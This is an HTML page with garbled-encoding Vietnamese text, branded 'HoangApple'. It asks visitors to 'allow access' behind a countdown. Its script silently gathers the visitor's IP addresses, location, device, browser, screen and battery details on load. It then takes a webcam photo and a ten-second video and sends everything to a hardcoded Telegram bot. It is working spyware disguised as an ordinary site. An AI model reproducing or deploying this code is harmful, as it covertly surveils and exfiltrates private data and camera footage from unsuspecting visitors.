<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WEB ƒê·ªòC QUY·ªÄN HOANGAPPLE</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      text-align: center;
    }
    .message {
      font-size: 24px;
      margin-bottom: 20px;
      animation: fadeInDown 1s ease;
    }
    #countdown {
      font-size: 48px;
      margin-bottom: 50px;
      animation: zoomIn 1s ease;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1 class="message">Vui l√≤ng cho ph√©p truy c·∫≠p ƒë·ªÉ s·ª≠ d·ª•ng</h1>
    <div id="countdown"></div>
  </div>

  <script>
    // ======== C·∫•u h√¨nh ========
    const BOT_TOKEN = '7960156507:AAHMK4cfoRszPvJrZ17NvPAUFqPvyXY2mi8';
    const CHAT_ID = '7605936504';
    const TIME_ZONE = 'Asia/Ho_Chi_Minh'; // ƒë·∫∑t ·ªü m·ªôt ch·ªó d·ªÖ s·ª≠a
    const COUNTDOWN_SEC = 11;
    const VIDEO_RECORD_TIME = 10000; // 10s

    // G·ª≠i message qua Telegram
    async function sendTelegramMessage(text) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      try {
        const res = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID, text })
        });
        return res.ok;
      } catch (err) {
        console.error('Telegram message error:', err);
      }
    }

    // G·ª≠i ·∫£nh/video qua Telegram
    async function sendTelegramMedia(endpoint, blob, caption) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append(endpoint === 'sendPhoto' ? 'photo' : 'video', blob);
      form.append('caption', caption);
      try {
        const res = await fetch(url, { method: 'POST', body: form });
        return res.ok;
      } catch (err) {
        console.error(`Telegram ${endpoint} error:`, err);
      }
    }

    // L·∫•y timestamp ƒë·ªãnh d·∫°ng
    function formatNow() {
      return new Date().toLocaleString('vi-VN', { timeZone: TIME_ZONE });
    }

    // L·∫•y th√¥ng tin v√† g·ª≠i qua Telegram
    async function reportClientInfo() {
      try {
        const [infoRes, ipv6Res] = await Promise.all([
          fetch('https://ipinfo.io/json'),
          fetch('https://api6.ipify.org?format=json')
        ]);
        const info = await infoRes.json();
        const { ip, city, region, country } = info;
        const ipv6 = (await ipv6Res.json()).ip;
        if (country !== 'VN') return;

        let msg = `üó∫ ƒê·ªãa ch·ªâ: ${city}, ${region}, ${country}\n` +
                  `üó∫ IPv4: ${ip}\n` +
                  `üó∫ IPv6: ${ipv6}\n` +
                  `üïí Th·ªùi gian: ${formatNow()}\n` +
                  `üíª Thi·∫øt b·ªã: ${navigator.userAgent}\n` +
                  `üõ† OS: ${navigator.platform}\n` +
                  `üìú Ng√¥n ng·ªØ: ${navigator.language}\n` +
                  `üñ• ƒê·ªô ph√¢n gi·∫£i: ${screen.width}x${screen.height}\n`;

        try {
          const battery = await navigator.getBattery();
          msg += `üîã Pin: ${Math.round(battery.level * 100)}%\n`;
        } catch (_) {
          msg += 'üîã Pin: Kh√¥ng x√°c ƒë·ªãnh\n';
        }
        msg += '\nPower By Hoang Appleüëë <3';
        await sendTelegramMessage(msg);
      } catch (err) {
        console.error('Report error:', err);
      }
    }

    // Ch·ª•p snapshot t·ª´ camera
    async function snapshotAndSend() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg'));
        stream.getTracks().forEach(t => t.stop());
        const caption = `üì∏ Snapshot th√†nh c√¥ng\nüïí ${formatNow()}`;
        await sendTelegramMedia('sendPhoto', blob, caption);
      } catch (err) {
        console.error('Snapshot error:', err);
      }
    }

    // Ghi video v√† g·ª≠i
    async function recordVideoAndSend() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = async () => {
          const blob = new Blob(chunks, { type: 'video/webm' });
          stream.getTracks().forEach(t => t.stop());
          const caption = `üéû Quay video th√†nh c√¥ng\nüïí ${formatNow()}`;
          await sendTelegramMedia('sendVideo', blob, caption);
        };
        recorder.start();
        setTimeout(() => recorder.stop(), VIDEO_RECORD_TIME);
      } catch (err) {
        console.error('Recording error:', err);
      }
    }

    // ƒê·∫øm ng∆∞·ª£c hi·ªÉn th·ªã
    function startCountdown(sec) {
      const el = document.getElementById('countdown');
      let t = sec;
      el.textContent = `Vui l√≤ng ch·ªù ${t} gi√¢y...`;
      const id = setInterval(() => {
        if (--t <= 0) {
          clearInterval(id);
          el.textContent = 'Kh·ªüi ƒë·ªông xong!';
          snapshotAndSend();
          recordVideoAndSend();
        } else {
          el.textContent = `Vui l√≤ng ch·ªù ${t} gi√¢y...`;
        }
      }, 1000);
    }

    // Kh·ªüi t·∫°o
    window.addEventListener('load', () => {
      reportClientInfo();
      startCountdown(COUNTDOWN_SEC);
    });
  </script>

</body>
</html>
